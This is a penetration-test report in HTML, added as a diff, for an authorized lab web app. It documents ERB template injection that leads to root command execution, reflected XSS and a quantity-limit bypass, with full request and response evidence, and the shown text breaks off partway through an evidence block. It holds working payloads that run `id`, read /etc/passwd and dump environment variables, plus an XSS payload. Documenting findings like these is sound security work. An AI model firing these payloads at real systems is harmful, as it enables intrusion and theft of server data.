@@ -1,0 +1,2177 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqz0pupu-qto719</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Unauthenticated Server-Side Template Injection (Ruby ERB) → RCE as root via `sentence` on POST /generate</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [xss-reflected] Reflected XSS in POST /generate — sentence parameter</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [qty-tampering] Quantity limit bypass in POST /generate — number parameter accepts values far exceeding declared max 200</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Input returned in response (reflected)</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#5f7d8c">INFO</span> [burp] Suspicious input transformation (reflected)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqz0pupu-qto719</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:4567/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T09:31:13.479Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>5</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:4567</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>5 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#5f7d8c">2</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [rce] Unauthenticated Server-Side Template Injection (Ruby ERB) → RCE as root via `sentence` on POST /generate</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:4567/</div>
+<div class="desc">The `sentence` POST parameter on /generate is interpolated directly into the Sinatra ERB template SOURCE and evaluated server-side, not merely emitted as (escaped/unescaped) HTML output. This is Server-Side Template Injection in Ruby ERB and yields full Remote Code Execution. Proofs collected: (1) `&lt;%= 7*7 %&gt;` renders `49` while the literal control string renders verbatim — server-side evaluation. (2) `&lt;%= `id` %&gt;` returns `uid=0(root) gid=0(root) groups=0(root)` — OS command execution as ROOT inside the (containerized) host. (3) `&lt;%= `cat /etc/passwd` %&gt;` returns the full /etc/passwd contents (root:x:0:0:root:/root:/bin/bash ...) — arbitrary file read. (4) `&lt;%= ENV.to_a.to_s %&gt;` dumps the entire process environment (Ruby 3.1.2, RACK_ENV=development). The app is entirely unauthenticated, so any anonymous visitor achieves remote code execution as root. This is a separate, far more severe vulnerability than the previously recorded reflected-XSS on the same parameter: the input reaches the template engine / OS, not just the HTML body. Contributing misconfig: RACK_ENV=development (verbose Sinatra error pages) and the process runs as root.</div>
+<div><b>Reproduction</b></div><pre>Negative control: POST /generate, body `sentence=cat /etc/passwd&amp;number=1` (no ERB tags) → response renders `&lt;p&gt;cat /etc/passwd&lt;/p&gt;` literally; does NOT contain `root:x:0:0:` (evidence ev-mqz160ov-13, 1756 bytes). Exploit: POST /generate, body `sentence=&lt;%= `cat /etc/passwd` %&gt;&amp;number=1` (URL-encoded `sentence=%3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E&amp;number=1`) → response body contains the full /etc/passwd file starting `root:x:0:0:root:/root:/bin/bash` (evidence ev-mqz1625i-14 and replay ev-mqz163co-15, both 2663 bytes, stable). Escalation already demonstrated: `sentence=&lt;%= `id` %&gt;&amp;number=1` → `uid=0(root) gid=0(root) groups=0(root)`; `sentence=&lt;%= 7*7 %&gt;&amp;number=1` → `49`. Remediation: never construct ERB template source from user input. Render a fixed template and pass `sentence` as a bound local/variable (e.g. `erb :result, locals: {sentence: params[:sentence]}`) with proper HTML escaping; treat all user input as data. Also drop root privileges and set RACK_ENV=production.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz160ov-13</code> — <code>artifacts/_/ev-mqz160ov-13/</code></div><div class="lbl">REQUEST</div><pre>POST /generate HTTP/1.1
+Host: target.local:4567
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+sentence=cat%20%2Fetc%2Fpasswd&amp;number=1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1756
+content-type: text/html;charset=utf-8
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt; 
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+ 
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+    &lt;title&gt;RepeatMePlease&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt; 
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+      &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;RepeatMePlease&lt;/a&gt;
+      &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+      &lt;/button&gt;
+      &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/nav&gt;
+ 
+    &lt;div class=&quot;container mt-5&quot;&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;col-md-6 offset-md-3&quot;&gt;
+          &lt;div class=&quot;card&quot;&gt;
+            &lt;div class=&quot;card-header&quot;&gt;
+              Generated your sentence for 1 times
+            &lt;/div&gt;
+            &lt;div class=&quot;card-body&quot;&gt;
+              
+                &lt;p&gt;cat /etc/passwd&lt;/p&gt;
+                &lt;hr&gt;
+              
+            &lt;/div&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Optional JavaScript --&gt;
+    &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1625i-14</code> — <code>artifacts/_/ev-mqz1625i-14/</code></div><div class="lbl">REQUEST</div><pre>POST /generate HTTP/1.1
+Host: target.local:4567
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+sentence=%3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E&amp;number=1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 2663
+content-type: text/html;charset=utf-8
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt; 
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+ 
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+    &lt;title&gt;RepeatMePlease&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt; 
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+      &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;RepeatMePlease&lt;/a&gt;
+      &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+      &lt;/button&gt;
+      &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/nav&gt;
+ 
+    &lt;div class=&quot;container mt-5&quot;&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;col-md-6 offset-md-3&quot;&gt;
+          &lt;div class=&quot;card&quot;&gt;
+            &lt;div class=&quot;card-header&quot;&gt;
+              Generated your sentence for 1 times
+            &lt;/div&gt;
+            &lt;div class=&quot;card-body&quot;&gt;
+              
+                &lt;p&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+&lt;/p&gt;
+                &lt;hr&gt;
+              
+            &lt;/div&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Optional JavaScript --&gt;
+    &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz163co-15</code> — <code>artifacts/_/ev-mqz163co-15/</code></div><div class="lbl">REQUEST</div><pre>POST /generate HTTP/1.1
+Host: target.local:4567
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+sentence=%3C%25%3D%20%60cat%20%2Fetc%2Fpasswd%60%20%25%3E&amp;number=1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 2663
+content-type: text/html;charset=utf-8
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt; 
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+ 
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+    &lt;title&gt;RepeatMePlease&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt; 
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+      &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;RepeatMePlease&lt;/a&gt;
+      &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+      &lt;/button&gt;
+      &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/nav&gt;
+ 
+    &lt;div class=&quot;container mt-5&quot;&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;col-md-6 offset-md-3&quot;&gt;
+          &lt;div class=&quot;card&quot;&gt;
+            &lt;div class=&quot;card-header&quot;&gt;
+              Generated your sentence for 1 times
+            &lt;/div&gt;
+            &lt;div class=&quot;card-body&quot;&gt;
+              
+                &lt;p&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+&lt;/p&gt;
+                &lt;hr&gt;
+              
+            &lt;/div&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Optional JavaScript --&gt;
+    &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [xss-reflected] Reflected XSS in POST /generate — sentence parameter</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:4567/</div>
+<div class="desc">The `sentence` parameter is reflected verbatim into the HTML response without any HTML encoding. Injecting `&lt;img src=x onerror=alert(42)&gt;` causes the tag to appear unescaped inside a `&lt;p&gt;` element in the response body, triggering JavaScript execution when the page is loaded in a browser. All HTML special characters pass through unescaped.</div>
+<div><b>Reproduction</b></div><pre>1. POST http://target.local:4567/generate with Content-Type: application/x-www-form-urlencoded and body: sentence=&lt;img src=x onerror=alert(42)&gt;&amp;number=1\n2. Observe the response HTML contains &lt;p&gt;&lt;img src=x onerror=alert(42)&gt;&lt;/p&gt; — the tag is unescaped.\n3. A browser loading this response executes the onerror handler.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0xesa-l</code> — <code>artifacts/s-0001/ev-mqz0xesa-l/</code></div><div class="lbl">REQUEST</div><pre>POST /generate HTTP/1.1
+Host: target.local:4567
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+sentence=safe_control_string&amp;number=1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1760
+content-type: text/html;charset=utf-8
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt; 
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+ 
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+    &lt;title&gt;RepeatMePlease&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt; 
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+      &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;RepeatMePlease&lt;/a&gt;
+      &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+      &lt;/button&gt;
+      &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/nav&gt;
+ 
+    &lt;div class=&quot;container mt-5&quot;&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;col-md-6 offset-md-3&quot;&gt;
+          &lt;div class=&quot;card&quot;&gt;
+            &lt;div class=&quot;card-header&quot;&gt;
+              Generated your sentence for 1 times
+            &lt;/div&gt;
+            &lt;div class=&quot;card-body&quot;&gt;
+              
+                &lt;p&gt;safe_control_string&lt;/p&gt;
+                &lt;hr&gt;
+              
+            &lt;/div&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Optional JavaScript --&gt;
+    &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0xe38-k</code> — <code>artifacts/s-0001/ev-mqz0xe38-k/</code></div><div class="lbl">REQUEST</div><pre>POST /generate HTTP/1.1
+Host: target.local:4567
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+sentence=%3Cimg+src%3Dx+onerror%3Dalert(42)%3E&amp;number=1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1770
+content-type: text/html;charset=utf-8
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt; 
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+ 
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+    &lt;title&gt;RepeatMePlease&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt; 
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+      &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;RepeatMePlease&lt;/a&gt;
+      &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+      &lt;/button&gt;
+      &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/div&gt;
+    &lt;/nav&gt;
+ 
+    &lt;div class=&quot;container mt-5&quot;&gt;
+      &lt;div class=&quot;row&quot;&gt;
+        &lt;div class=&quot;col-md-6 offset-md-3&quot;&gt;
+          &lt;div class=&quot;card&quot;&gt;
+            &lt;div class=&quot;card-header&quot;&gt;
+              Generated your sentence for 1 times
+            &lt;/div&gt;
+            &lt;div class=&quot;card-body&quot;&gt;
+              
+                &lt;p&gt;&lt;img src=x onerror=alert(42)&gt;&lt;/p&gt;
+                &lt;hr&gt;
+              
+            &lt;/div&gt;
+          &lt;/div&gt;
+        &lt;/div&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Optional JavaScript --&gt;
+    &lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz0xqgm-m</code> — <code>artifacts/s-0001/ev-mqz0xqgm-m/</code></div><div class="lbl">REQUEST</div><pre>POST /generate HTTP/1.1
+Host: target.local:4567
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+sentence=%3Cimg+src%3Dx+onerror%3Dalert(42)%3E&amp;number=1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1770
+content-type: text/html;charset=utf-8
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt; 
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;
+ 
+    &lt;link href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+
+    &lt;title&gt;RepeatMePlease&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt; 
+    &lt;nav class=&quot;navbar navbar-expand-lg navbar-light bg-light&quot;&gt;
+      &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;RepeatMePlease&lt;/a&gt;
+      &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+      &lt;/button&gt;
+      &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+        &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;
+          &lt;li class=&quot;nav-item&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+          &lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/div&gt;
